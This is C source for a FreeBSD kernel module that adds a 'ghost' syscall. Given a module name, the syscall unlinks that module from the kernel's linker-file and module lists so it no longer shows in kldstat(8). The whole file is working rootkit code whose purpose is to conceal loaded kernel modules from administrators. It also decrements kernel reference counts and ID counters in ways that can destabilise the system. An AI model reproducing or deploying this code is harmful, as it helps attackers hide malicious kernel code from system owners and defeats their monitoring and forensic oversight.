/*
 * This KLD creates a new syscall that accepts a string. It then removes a KLD
 * that has a name matching that string.
 * and modules list. As a result, those KLDs are hidden from kldstat(8).
 */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/queue.h>
#include <sys/linker.h>
#include <bsm/audit_kevents.h>

#define MAX_STRING_SIZE 256

/* Linker file lists */
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

/* Modules list */
typedef TAILQ_HEAD(, module) module_list_t;
extern module_list_t modules;
extern int nextid;
struct module {
    TAILQ_ENTRY(module) link; /* chain together all modules */
    TAILQ_ENTRY(module) flink; /* all modules in a file */
    struct linker_file* file; /* file which contains this module */
    int refs; /* reference count */
    int id; /* unique id number */
    char* name ;/* module name */
    modeventhand_t handler; /* event handler */
    void* arg; /* argument for handler */
    modspecific_t data; /* module specific data */
};

struct ghost_args {
    char *filename;
};

static int ghost(struct thread *td, void *syscall_args) {
    struct ghost_args *uap = (struct ghost_args *) syscall_args;
    char module_name[MAX_STRING_SIZE];
    char linker_name[MAX_STRING_SIZE];
    size_t copied;
    int error;

    struct linker_file *lf;
    struct module *mod;

    /* Get module name */
    error = copyinstr(uap->filename, module_name, sizeof(module_name), &copied);
    if (error != 0) {
        return(error);
    }

    /* Craft linker name (concatenate .ko) */
    snprintf(linker_name, sizeof(linker_name), "%s.ko", module_name);

    sx_xlock(&kld_sx);

	/* Decrement kernel image's reference count */
	(&linker_files)->tqh_first->refs--;

	/* Remove linker_name from linker_files list. */
	TAILQ_FOREACH(lf, &linker_files, link) {
		if (lf->filename != NULL && strcmp(lf->filename, linker_name) == 0) {
		    next_file_id--;
			TAILQ_REMOVE(&linker_files, lf, link);
			break;
		}
	}

	sx_xunlock(&kld_sx);

	sx_xlock(&modules_sx);

	/* Remove module_name from modules list. */
	TAILQ_FOREACH(mod, &modules, link) {
		if (mod->name != NULL && strcmp(mod->name, module_name) == 0) {
		    nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);

    /* FreeBSD use () with return, that's so weird */
    return(0);
}

static struct sysent ghost_sysent = {
    ghost,
    NULL,
    1
};

/* Offset in sysent[] where the system call is to be allocated */
static int offset = NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg) {
    int error = 0;
    switch (cmd) {
        case MOD_LOAD:
            uprintf("System call loaded at offset %d.\n", offset);
            break;
        case MOD_UNLOAD:
            uprintf("System call unloaded from offset %d.\n", offset);
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }
    return(error);
}

SYSCALL_MODULE(ghost, &offset, &ghost_sysent, load, NULL);
